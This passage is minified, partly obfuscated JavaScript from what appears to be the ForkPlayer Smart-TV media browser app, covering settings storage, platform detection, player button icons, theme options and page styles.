is_git=1; var is_ver='2509.1214'; if(window.Player&&window.breakScreen&&window.tonloaded){if(document.getElementById('startcmd'))document.getElementById('startcmd').innerHTML='JS app already loaded!';throw new Error("JS app already loaded!")}
var ua=navigator.userAgent.toLowerCase();var video,ll1lIRuOcl10I1OYpr=0,select=0,pstream=!1,l0lIl1lTqx011IYpr="",handler="menu",prev={};var sNext=["","_FPPosledovatelno_","_FPPovtoryat_ _FPodin_","_FPPovtoryat_ _FPvse_","_FPOtkl_"];var f_font="Calibri|Roboto|Arial|Times New Roman|Courier New|Georgia|Trebuchet MS".split("|");var startX=9,oldselect=0;var info_mode=0;var tscreen="main",payd={};var chGroup=[],chGroupSel=0;var templic=0;var baseurl={};var rek_num=0,apijsUrl="";var lO01II111Irn0OI1IlYpr=[];var ll0IO0OIxzk1llIIOYpr=37;var ch_size=29;if(typeof ttmac=="undefined")var ttmac=!1;var backtimer,stimer;var allTimes={},userGrid=null;var iframeExit=0,screensavertimer=-1,isScreensaver=!1;if(typeof curWidget!="object"){curWidget={}}
if(window.top!==window.window){}
function gVs(v,ind1){var r=String(gV(v,ind1));if(r.match(/^(null|undefined)$/))r="";return r}
function gV(v,ind1){if(typeof v=="undefined"||v==null){return""}
if(ind1!=null){if(typeof v[ind1]!="undefined"&&v[ind1]!=null){return gV(v[ind1])}
return""}
return v}
function lIlI1VBOOlI01QYpr(s){if(typeof JSON!=="undefined"&&typeof s==="string"&&s){try{return JSON.parse(s)}catch(e){return null}}
return null}
function l1OOl0I0IASY10lQ10Ypr(s){if(typeof JSON!=="undefined"&&typeof s!=="undefined"){try{return JSON.stringify(s)}catch(e){return""}}
return""}
function randomInt(min,max){return Math.floor(Math.random()*(max-min+1)+min)}
function gP(k){if(Il01QllQll()==null)return null;else if(k!=null){if(gP()!=null)return gP()[k]}else return Il01QllQll().page}
function IlIll11I(k){if(Il01QllQll()==null)return null;else if(k!=null){if(IlIll11I()!=null)return IlIll11I()[k]}else return Il01QllQll().loadPage}
function gPL(k){return IlIll11I(k)||gP(k)}
function Il01QllQll(k){if(k!=null){if(Il01QllQll())return Il01QllQll()[k]}else return oInset.tabs[insetActive]}
function $_(id,text,main){if(text==null){var x=document.getElementById(id);if(!main&&!x){var subsite=document.getElementById("subsite");var site=document.getElementById("site");var playerjs2=document.getElementById("playerjs2");if(subsite&&subsite.style.display=="block"&&subsite.contentWindow&&subsite.contentWindow.document){x=subsite.contentWindow.document.getElementById(id)}
if(!x&&site&&site.contentWindow&&site.contentWindow.document){x=site.contentWindow.document.getElementById(id)}
if(!x&&playerjs2&&playerjs2.contentWindow&&playerjs2.contentWindow.document){x=playerjs2.contentWindow.document.getElementById(id)}}
return x||null}
var bid=(typeof id=="object")?id:$_(id);if(bid){var s=maJor.fp(text);if(maJor.platform()=="maple"&&typeof widgetAPI!="undefined"){widgetAPI.putInnerHTML(bid,s)}else{bid.innerHTML=s}}else{}}
function _img(s){if(!s||s.match(/^.{0,3}(none|hidden|undefined)/))s="_ST_1px.png";s=s.replace("_ST_","https://raw.githubusercontent.com/komivp/appinfodl/main/static/").replace(/_OI_|_OT_/,"http://staticdata.appfxml.com/staticfiles/old/");if(window.maJor&&maJor.urlFilter)s=maJor.urlFilter(s);if(s.indexOf("ndate")>0){var mtc=s.match(/ndate(.*?)_/);var n=(mtc?mtc[1]:180929)}else n=180929;if(!gV(window,"version_client").match(/(a|t)ForkPlayer3.0/)&&version_local_files>=n&&!s.match(/(controller_up2|f_home|page_menu_white|check\.png|folder-pen|link\.png|lucide)/)&&!s.match(/visual(2|3).gif$/)&&(!s.match(/fon..?\.(jpg|png)$/)||s.indexOf("fon20.jpg")>0)){s=s.replace("https://raw.githubusercontent.com/komivp/appinfodl/main/static/","static/")}
return s}
var counterr=0;function jsshowErr(text,duration){var img=document.createElement('img');var u='http://browser.appfxml.com/gstatic.php?do=errstartup&ver=12&'+gV(window,"is_ver")+'&m='+counterr+" / "+encodeURIComponent(text)+" / "+gVs(window,"l0lIl1lTqx011IYpr");u+=" / "+IlIll11I("lO10111O0001lOl00Ypr")||gP("lO10111O0001lOl00Ypr")+" / "
if(window.maJor){u+=maJor.build;u=maJor.addident(u)}
img.src=u;duration=duration||2;if(++counterr>5||duration<0)return;var div=document.createElement('div');div.textContent="Error: "+text.substr(0,150);div.style.position='fixed';div.style.top='10';div.style.left='10';div.style.backgroundColor='black';div.style.color='white';div.style.padding='10px';div.style.opacity='0';div.style.transition='opacity 0.5s ease-in-out';document.getElementsByTagName('body')[0].appendChild(div);setTimeout(function(){div.style.opacity='1'},100);setTimeout(function(){div.style.opacity='0'},duration*1000);setTimeout(function(){div.parentNode.removeChild(div)},(duration+0.5)*1000)}
if(typeof Common!=="undefined"&&Common.API){var widgetAPI=null;var pluginAPI=null;if(typeof Common.API.Widget==="function"){widgetAPI=new Common.API.Widget()}
if(typeof Common.API.Plugin==="function"){pluginAPI=new Common.API.Plugin()}
if(typeof console!=="undefined"&&typeof console.log==="function"){console.log=function(a){alert(a)}}}
if(typeof String.prototype.slice!=="function"){String.prototype.slice=function(start,end){var result="";if(typeof end==="undefined"||end>this.length){end=this.length}
for(var i=start;i<end;i++){result+=this.charAt(i)}
return result}}
if(typeof Array.prototype.slice!=="function"){Array.prototype.slice=function(start,end){var result=[];if(typeof end==="undefined"||end>this.length){end=this.length}
for(var i=start;i<end;i++){result[result.length]=this[i]}
return result}}
var maJor={GL:null,user:null,countHw:1.4,ua:navigator.userAgent.toLowerCase(),href:document.location.href,FileObj:{},FileObjC:{},box_low:0,virtual:0,build:0,torver:0,seSt:[],box_client:"ForkXMLviewer",ipCountry:"",Password:"",uadns:"",sdk:0,api:"js",autoimpok:0,ipG:window.ipG,timestamp:-4,panelPad:16,allfs:["glsearch","glstart","history","settings","epg_set","url0","url1","url2","url3","url4","url5","url6","url7","urlInset","searches","enteres","zakladki.xml","zakladkiSerials.xml","zakladkiFilms.xml","zakladkiIPTV.xml","times","vk_audio_pl","vk_audio_sel","vk_pl_url","bookmarks","lic","mlang","ordered","xr","url8","url9","storage","lastdata","datas"],f_cols:{"#EEEEEE":"По умолчанию","#FFFFFF":"Белый","#DDDDDD":"Светлый серый","#CCCCCC":"Серая дымка","#FFFAF0":"Слоновая кость","#F5F5DC":"Бежевый","#FFD700":"Золотой","#FFDD99":"Тёплый свет","#FFB6C1":"Нежно-розовый","#F08080":"Розовый рассвет","#87CEEB":"Небесный свет","#ADD8E6":"Пастельный голубой","#B0E0E6":"Морская пена","#90EE90":"Нежно-зелёный","#98FB98":"Пастельная мята","#F0E68C":"Светлая охра","#FFE4B5":"Мягкий песок","#FFDAB9":"Персик","#D8BFD8":"Лаванда","#E6E6FA":"Лавандовый туман"},tilefons:{"#1f2a44":"По умолчанию","#5d8a9a":"Морской бриз","#2e3b4e":"Глубина ночи","#1c1f26":"Абсолютная тьма","#36454f":"Сланцевый камень","#556b2f":"Тёмная олива","#2f4f4f":"Холодная бирюза","#483d8b":"Туманная сирень","#4b0082":"Индиго","#800000":"Винный закат","#5c4033":"Горький кофе","#2c3e50":"Ночной океан","#3b3b3b":"Графит","#4f2f4f":"Слива в тени","#6a7d89":"Стальной туман","#7b3f00":"Жар песков","#0f3d3e":"Изумрудная бездна","#1a2421":"Хвойный лес","#5e1742":"Тёмная вишня","#2e1f27":"Шёлковый бархат","transparent":"Прозрачный"},focusfons:{"rgba(180, 180, 180, 0.7)":"По умолчанию","rgba(255, 99, 71, 0.4)":"Тёплый красный","rgba(255, 165, 0, 0.4)":"Оранжевый","rgba(255, 215, 0, 0.4)":"Золотой","rgba(173, 216, 230, 0.4)":"Голубой","rgba(135, 206, 250, 0.4)":"Небесный","rgba(0, 255, 127, 0.4)":"Мятный","rgba(50, 205, 50, 0.4)":"Лаймовый","rgba(147, 112, 219, 0.4)":"Сиреневый","rgba(138, 43, 226, 0.4)":"Фиолетовый","rgba(255, 20, 147, 0.4)":"Розовый","rgba(255, 105, 180, 0.4)":"Горячий розовый","rgba(64, 224, 208, 0.4)":"Бирюзовый","rgba(0, 191, 255, 0.4)":"Глубокий голубой","rgba(255, 255, 255, 0.2)":"Светлый прозрачный"},nupd:0,TS:null,sQual:[1080,720,480,360,240],jsonSets:["browser","JTVRegion","next","quality","passwordkey","password","recovery","player","fon","pr","color","remote","remoteip","streamplayer","lang","panel","Ph","Pw","vk_code","vk_id","vk_token","fs","sortiptv","xmode","pip","audioplayer","ts","timeoutiptv","rate","country","ads","livesearch","weather","serv","sidebar","return","adult","time","udp","keyboard","proxy","third","scrsaver","name","zoom","acestream","font","torrserve","headers","torrserve2","tile","focus","tileurl","tileiconheight","tiletitleheight"],allPlayerButton:{"stop":{"img":"_ST_button_pause.png","row":[0,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="4" height="18" x="6" y="3"></rect><rect width="4" height="18" x="14" y="3"></rect></svg>'},"play":{"img":"_ST_button_play.png","row":[1,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>'},"rewind":{"img":"_ST_button_rewind.png","row":[2,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 19 2 12 11 5 11 19"></polygon><polygon points="22 19 13 12 22 5 22 19"></polygon></svg>'},"forward":{"img":"_ST_button_forward.png","row":[3,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 19 22 12 13 5 13 19"></polygon><polygon points="2 19 11 12 2 5 2 19"></polygon></svg>'},"option":{"img":"_ST_button_option.png","row":[4,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"></path><circle cx="12" cy="12" r="3"></circle></svg>'},"prop":{"img":"_ST_ratio.png?ndate240209_","row":[5,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6V12H6V8L10 8V6H4Z" fill="#ffffff"></path> <path d="M20 18H14V16H18V12H20V18Z" fill="#ffffff"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M4 2C1.79086 2 0 3.79086 0 6V18C0 20.2091 1.79086 22 4 22H20C22.2091 22 24 20.2091 24 18V6C24 3.79086 22.2091 2 20 2H4ZM20 4H4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4Z" fill="#ffffff"></path></svg>'},"lastview":{"img":"_ST_button_last.png","row":[6,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"> <path d="M5.81824 6.72729V14H13.091"></path> <path d="M4 24C4 35.0457 12.9543 44 24 44V44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4C16.598 4 10.1351 8.02111 6.67677 13.9981"></path> <path d="M24.005 12L24.0038 24.0088L32.4832 32.4882"></path></svg>'},"prev":{"img":"_ST_button_prev.png","row":[7,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 12 22 3 22 21 6 12"></polygon><polygon points="2 3 3 3 3 21 2 21"></polygon></svg>'},"next":{"img":"_ST_button_next.png","row":[8,1],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="4 3 18 12 4 21 4 3"></polygon><polygon points="21 3 22 3 22 21 21 21"></polygon></svg>'},"minimize":{"img":"_ST_button_hide.png","row":[0,3],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18,13 L6,13"></path></svg>'},"fullscreen":{"img":"_ST_fullscreen.png?ndate240209_","row":[1,3],"svg":'<svg width="32px" height="32px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><path d="M29 10H38V19"></path><path d="M38 29V38H29"></path><path d="M19 38H10V29"></path><path d="M10 19V10H19"></path></svg>'},"exit_text":{"img":"_ST_button_close.png","row":[2,3],"svg":'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M6.34314575 6.34314575L17.6568542 17.6568542M6.34314575 17.6568542L17.6568542 6.34314575"></path></svg>'}},omniBut:[{"id":"kb1","onclick":"gotoStart();","img":"_ST_f_home.png?ndate240209_"},{"id":"kb2","onclick":"tmf();","img":"_ST_page_back.png"},{"id":"kb3","onclick":"Il01QllQll().forward();","img":"_ST_page_fwd.png"},{"id":"kb4","onclick":"page_rs();","img":"_ST_page_reload.png"},{"id":"top2text","onclick":"oInset.editUrl();","img":"_ST_page_home.png"},{"id":"kb5","onclick":"ContextMenu.show('favmenu');","img":"_ST_f_fav_off.png?ndate240209_","img2":"_ST_f_fav_on.png?ndate240209_"},{"id":"kb6","onclick":"ContextMenu.show('topmenu');","img":"_ST_menu_yellow.png?ndate240222_"}],urlFilter:function(s){var r={"http://fxmlparsers.ru":"http://fxmlparsers.in.net","http://p.lnka.ru":"http://parsers.appfxml.com","http://p2.lnka.ru":"http://parsers.appfxml.com","http://spiderxml.com":"http://spider.appfxml.com"};s=maJor.parsers.car(s);for(var oldUrl in r){if(s.indexOf(oldUrl)===0){s=s.replace(oldUrl,r[oldUrl])}}
return s},setHandler:function(h){handler=h},supports:{svg:!!(document.createElementNS&&document.createElementNS('http://www.w3.org/2000/svg','svg').createSVGRect)},ds:function(){var c=this;var k={JTVRegion:2,next:1,remoteip:"",quality:1,clear:0,passwordkey:'0000',password:'',recovery:1,player:'html5',streamplayer:'jw',fon:"",lang:"ru",country:0,pr:70,color:"#EEEEEE",search:3,remote:0,buffer:2,ibuffer:15,third:0,xmode:0,Pw:100,Ph:100,timeoutiptv:35,vk_code:'',vk_id:"",vk_token:"",audioplayer:"1",headers:0,fs:"1",rate:0,ts:0,sortiptv:0,acestream:"",torrserve:"",torrserve2:"-1",serv:"",pip:0,sidebar:0,scrsaver:1,font:"",adult:0,time:0,zoom:"100",keyboard:"",panel:1};if(c.href.indexOf("/workspace/")>0||c.model=="sonyplaystation")k.headers=0;if(c.platform()=="lgw2")k.player="ifrhtml5";if(c.platform()=="tizen")k.player=k.streamplayer="tizen";else if(c.platform().match(/maple|mag|dune/)){k.player=k.streamplayer="media";k.headers=1}else if(c.platform()=="android-device"){k.Pw=1280;k.Ph=720;if(!c.sdk)c.getAndrInit();if(c.sdk>20){k.keyboard="system";k.player="html5";k.streamplayer="jw";k.headers=1}else k.player=k.streamplayer="manual"}
if(c.box_low)k.fon=-1;return k},readC:function(n){var c=this;if(c.platform().match(/android-device|maple/)){return""}
if(typeof c.FileObjC[n]!=="undefined"){return c.FileObjC[n]}
var matches=null;var cookiePattern=new RegExp("(?:^|; )"+n.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+"=([^;]*)");if(typeof document.cookie==="string"){matches=document.cookie.match(cookiePattern)}
if(matches&&matches[1]){return decodeURIComponent(matches[1])}
return""},writeC:function(name,value){var c=this;if(c.platform().match(/android-device|maple/)){return}
if(typeof name!=="string"||name.trim()===""||typeof value!=="string"){return}
c.FileObjC[name]=value;var props={path:"/",expires:"Wed, 20 Apr "+(new Date().getFullYear()+10)+" 22:20:11 GMT"};var updatedCookie=encodeURIComponent(name)+"="+encodeURIComponent(value);for(var propName in props){if(props.hasOwnProperty(propName)){updatedCookie+="; "+propName+"="+props[propName]}}
if(typeof document!=="undefined"&&typeof document.cookie==="string"){document.cookie=updatedCookie}},read:function(n){var c=this,s;try{if(n=="")return"";if(n!="ts"&&(c.platform()=="mag"||(c.autoimpok>=2&&c.params.get("ts")>0)))s=c.FileObj[n];else if(c.platform()=="maple"&&FileSystem){var fileSystemObj=new FileSystem();if(!c.validateDir){if(!fileSystemObj.isValidCommonPath(curWidget.id))fileSystemObj.createCommonDir(curWidget.id);c.validateDir=1}
var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'r');if(fileObj!=null){s=fileObj.readAll();fileSystemObj.closeCommonFile(fileObj)}}else if(window.localStorage)s=localStorage.getItem(n);if(gV(s)===""&&n.match(/^(settings|ID|IDS|oID)$/))s=c.readC(n);if(n=="settings"){var t=(s||"").split("|");if(t.length==50)t[49]="-1";if(t.length>10){var a={"zakladki.xml":'_FPzakladki_ / _FPRaznoe_',"zakladkiSerials.xml":"_FPzakladki_ / _FPSeriali_","zakladkiFilms.xml":"_FPzakladki_ / _FPFilmi_","zakladkiIPTV.xml":"_FPzakladki_ / IPTV"};for(var i=0;i<c.jsonSets.length;i++){a[c.jsonSets[i]]=(t[i]||"").replace(/%7C/g,"|")}
s=l1OOl0I0IASY10lQ10Ypr(a)}}
return gV(s).replace(/_OS_/g,"http://exec2.remotecurl.appfxml.com/os/").replace(/_OL_/g,"http://exec2.remotecurl.appfxml.com/curl/command/?uri=").replace(/\r|\n|\t/g,"")}catch(e){c.errwrite=1;jsshowErr("Read Local storage "+n+" "+e.message,1);return""}},wchanged:0,getUsedLocalStorageSpace:function(){var localStorageLength=0;var fss="";for(var key in localStorage){if(localStorage.hasOwnProperty(key)&&typeof localStorage[key]==="string"){fss+=" ["+key+"]="+localStorage[key].length;localStorageLength+=localStorage[key].length}}
return localStorageLength+"b"+fss},optimizeLocalStorageSpace:function(){try{var del=["prev_cache","datas","vk_audio_pl","history","prev","enteres","rek","lastdata","times","history","datas"];for(var key in del){localStorage.removeItem(del[key])}}catch(e){jsshowErr("optimize local storage "+e.message,1)}},write:function(n,v){var c=this;if(c.FileObj[n]===v){return}
if(String(n).match(/glstart|bookmarks|history|zakladki|storage|times|settings|url/)){c.wuchanged=1}
c.wchanged=1;v=String(v).replace(/\r|\n|\t/g,"");c.FileObj[n]=v;try{if(c.platform()=="maple"&&FileSystem){var fileSystemObj=new FileSystem();var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'w');if(fileObj!=null){fileObj.writeAll(v);fileSystemObj.closeCommonFile(fileObj)}}else if(window.localStorage&&c.platform()!="mag"){if(v==="")localStorage.removeItem(n);else localStorage.setItem(n,v)}else if(n.match(/^(settings)$/))c.writeC(n,v);if(n.match(/^(ID|IDS|oID)$/))c.writeC(n,v)}catch(e){c.errwrite=1;jsshowErr("Local storage "+n+" "+e.message+" "+c.getUsedLocalStorageSpace(),1);c.optimizeLocalStorageSpace()}},capitalizeFirstLetter:function(string){if(!string||string.length===0){return""}
var firstChar=string.substring(0,1);var restOfString=string.substring(1);firstChar=firstChar.toUpperCase?firstChar.toUpperCase():firstChar;return firstChar+restOfString},params:{getName:{"store":{"-1":"_FPOnly local_",0:"_FPLocal_",1:"_FPOn Server_",2:"_FPOtkl_",},"ads":{0:"Off",1:"On",2:"Always"}},getInfo:function(n,r){if(typeof r==="undefined")r=this.get(n);if(String(n).match(/acestream|torrserve|remote/)){if(r===""||r==2){return"_FPAuto_: "+(maJor.params.get('remote')?getip(n):"_FPOtkl_")}else if(r==0||r==-1){return"_FPOtkl_"}else if(r==1){return"_FPVkl._"}else if(r==3)return"_FPManually_ "+getip(n);else if(String(r).match(/.*:.*@.*/))r=String(r).replace(/.*@/,"***@")}
if(n=="quality"){r=maJor.sQual[r];if(r==1080)return"_FPHighest_";else if(r==720)return"_FPHigh_ "+r+"p";else if(r==480)return"_FPMedium_ "+r+"p";else if(r==360)return"_FPLow_ "+r+"p";else if(r==240)return"_FPVery low_ "+r+"p";else return r+"p"}
return r},get:function(n){var c=maJor;if(n=="history"){var t=lIlI1VBOOlI01QYpr(c.read("history"))||[];var k=0,ln=t.length;for(var i=0;i<ln;i++){if(!t[i-k]||!t[i-k].xml_url){t.splice(i-k,1);k++}}
return t}
if(n=="zakladki.xml")return'_FPZakladki_ / _FPRaznoe_';if(n=="zakladkiSerials.xml")return'_FPZakladki_ / _FPSeriali_';if(n=="zakladkiFilms.xml")return'_FPZakladki_ / _FPFilmi_';if(n=="zakladkiIPTV.xml")return'_FPZakladki_ / IPTV';if(n=="ver"){c.ver=c.read(n)||c.readC(n)||librarys.versions().stable;if(c.ver=="beta")c.ver=librarys.versions().beta;if(c.ver==librarys.versions().stable)c.ver+=" (stable)";else if(c.ver==librarys.versions().oldstable)c.ver+=" (oldstable)";else if(c.ver<=librarys.versions().old)c.ver+=" (OLD)";else c.ver+=" (beta)";return c.ver}
if(n=="ts"){if(c.platform()=="mag")return 1}
if(!c.GL)c.GL=lIlI1VBOOlI01QYpr(c.read("settings"))||c.ds();if(n.match(/^(hm|ID|IDS|oID|ts)$/))var r=c.read(n)||c.readC(n);else r=gV(c.GL,n);if(n=="browser"){if(r!="ott")r="Fork";return r}
if(n=="fon"&&c.read("mf")){r=c.read("mf");c.write("mf","");this.set("fon",r)}
if(n=="tile")return r||"#1f2a44";if(n=="focus")return r||"rgba(180, 180, 180, 0.7)";if(n=="tileurl")r=(r==="")?1:r;if(n=="tileiconheight")return r||76;if(n=="tiletitleheight")return r||2;if(n==="color")return(r&&String(r).indexOf("#")===0)?String(r):"#EEEEEE";if(n=="font")return f_font[r]||r||f_font[0];if(n=="zoom"&&!r)r=100;if(n=="panel"&&r!=1)r=0;if(n=="name"&&(!r||r.match(/_undefined$/))){var synonyms=["Cube","Gazeatron","Gazebabble","Runner","Boxing","Flatfoot","Remote-dependent","Screenmaniac","Pixel","Discoball","Bug","Brain-switch-off","Monitor","Folder","Chillaxer","Indicator","Towerbridge","Remote","Remote controler","Remote-expert","Remote-right","Modebox","Watchbox","Telebelly","myTV","Telebrawl","Televisionder","TV-room","TV-double","Tubeviewer","Screenwatcher","TV-set","Boxtail","Box","Crocodile","Monster","Plasma","Panel","Screen","Telebelly","Picture","Transmitter","Switch","Window","Show","Tube","Cube","Goblet","Madman","Zombie","Cinema","Lamp","Lightbulb","Display","Monitor","Three-eyed","Tweak","Gadget","Eye","King","Ship","Magical","Magic","Wizard","Witch","Sorcerer","Sorceress","Enchanter","Enchantress","Magician","Illusionist","Conjurer","Conjuror","Warlock","Necromancer","Thaumaturge","Thaumaturgist","Soothsayer","Seer","Oracle","Prophet","Diviner","Augur","Adept","Occultist","Mystic","Mystical","Mystifier","Mystagogue","Mystago","Visionary","Dreamer","Observer","Perceiver","Thinker","Analyzer","Strategist","Inventor","Planner","Forecaster"];r=c.capitalizeFirstLetter(c.platform())+"_"+(c.hardware||synonyms[randomInt(0,synonyms.length)]);c.GL[n]=r;this.save()}
if(n=="ads"){if(gVs(r)==="")r=1;if(r==0&&c.timestamp<3){r=1}}
if(r==="true"||r===!0)return 1;else if(r==="false"||r===!1)return 0;else if(n.match(/^(serv|sortiptv|buffer|xmode|time|next|JTVRegion|recovery|ts)$/)&&r!=="")r=parseInt(r)||r;if(n.match(/^(Pw|Ph)$/)&&r!=="")r=parseFloat(r)||r;if(n.match(/^(xmode|ts)$/))r=r||0;if(r==='0'||r===0||(n=="quality"&&r>4))return 0;return(r||"")},set:function(n,s,prop){var c=maJor;if(typeof n=="object"){for(var i in n)this.set(n[i],s);}else{if(prop){if(gV(prop,min)!==""&&s<prop.min)s=prop.max||prop.min;else if(gV(prop,max)!==""&&s>prop.max)s=prop.min||prop.max}
if(n.match(/^(hm|ts|ID|IDS|oID|ver)$/)){c.writeC(n,s);c.write(n,s)}else{c.GL[n]=s;this.save()}}
return c.params},save:function(){var c=maJor;var v="";for(var i=0;i<c.jsonSets.length;i++){var x=gV(c.GL,c.jsonSets[i]);if(typeof x=="string")x=x.replace(/\|/g,"%7C");v+=x+"|"}
c.write("settings",v)}},appStyles:function(){var c=this;var head=document.getElementsByTagName('head')[0];var styles='#main{width:100%;height:100%;position:absolute;overflow:hidden;left:0px;top:0px;font-size:28px;cursor: default;} '+'#QualCh{word-break: break-all;text-align:left;display: none; position: absolute;right: 19%;bottom: 27%;background-color: #1e1e1e;width: 37%; z-index: 2; overflow: hidden; font-size: 27px; border-radius: 15px;}'+'#pr{width:100%;height:100%;}'+'*:focus{outline: none;}'+'.p_info{font-size: 17px;border: 1px solid gray;padding: 0px 2px;margin-left:4px;}'+'.insetico{max-width:20px;max-height:23px;padding-top:2px;margin: auto;}'+'#icoedit{border-radius: 6px;width:30px;height:30px;}'+'#iactive{border-radius:5px;float:right;margin-top:6px;width:13px;height:13px;background-color: #636363;}'+'.newinset{font-family: serif;height: 26px;margin: -1px 0px 0px 3px;  border-radius: 50%;float:left;padding: 0px 6px;font-size:26px;line-height:26px;font-weight:bold;}'+'.itab{height: 100%;border-radius: 10px 10px 0px 0px;padding: 0px 2px;margin: 0px 2px;}'+'.maintab{position: relative;height: 30px;float:left;overflow: hidden;}'+'.dinset{float:left;}'+'.pbut{overflow:hidden;margin:0px;padding:8px 10px 2px 10px;border-radius:5px;text-align:center;display:inline-block;height:40px;}'+'.ibrd{width: 0px;height: 17px;margin-top: 5px;float: right;}'+'.ittl{overflow: hidden;background-color:transparent;margin-left: 4px;}'+'.cbutton{border-radius: 4px;padding: 2px 7px;font-size: 85%; margin: 5px;}'+'.sdbar{height:18px;overflow:hidden;border: 2px solid transparent;float:left;padding:2px; margin:0px;line-height: 20px;}'+'#navurl{padding-left: 5px;overflow:hidden;}'+'#scweather svg{height:26px;margin-top: 3px;}'+'#upbar svg{height:14px;margin-top:1px;}'+'.appwidgets svg{margin: 2px;width:18px;}'+'.appwidgets{text-align:right;height:20px;overflow:hidden;display:inline-block;}'+'#widgets{padding-top: 5px;text-align: right;height:29px;overflow:hidden;float:right;margin-right: 15px;font-family: Inter, sans-serif;}'+'.widgetdc{position: absolute;width:18px;height: 18px;background-color:rgba(0,0,0,0.35);}'+'#widgets_time{min-width: 153px;}'+'.menucontext{height: 25px;line-height: 24px;width:auto;overflow:hidden;text-wrap: nowrap;border-radius: 5px;}'+'.menuicon{float:left;height: 100%;width:28px;padding-top:0px;text-align: center;}'+'.menuicon img{height:16px;}'+'#vk{ position: absolute;top: 20px !important;left: 5% !important;width: 90%;height: 90%; text-align: center;  z-index: 3;  background-color: #1e293b !important;   border-radius: 12px; color: #fff;  font-family: Arial, sans-serif;border: 1px solid #475569;padding: 10px;font-size:25px;}'+'.vokey{float:left;position: relative;height: 43px;line-height: 43px;width: 43px;overflow:hidden;border-radius:6px;margin:1px 2px;}'+'.vkey svg, .vkey img{vertical-align: middle;width:25px;height:25px;}'+'.menubefore{border-bottom: 1px solid #ccc;margin-bottom: 5px;text-align: center;}'+'#sidebar{height: 27px;width: 100%;overflow: hidden;padding: 3px 3px 0px 0px;font-size: 16px;white-space: nowrap;background-color: #4b4b4b;}'+'#progressBarClick{width:84%;margin-left:15%;height:6px;background-color:#cccccc;position: absolute;}'+'#popUp{word-break: break-all;display: none; position: absolute; top: 84%; left: 75%; text-align: left; width: 23%; overflow: hidden; font-size: 16px; color: rgb(118, 118, 118); background-color: rgb(252, 252, 254); padding: 6px; border-radius: 6px; border: 1px solid rgb(118, 118, 118); z-index: 3;}'+'#player{display: none; position: absolute; margin: 0px; width: 100%; height: 100%; left: 0px; top: 0px; padding: 0px; font-size: 26px; overflow: hidden;}'+'body{overflow: hidden; 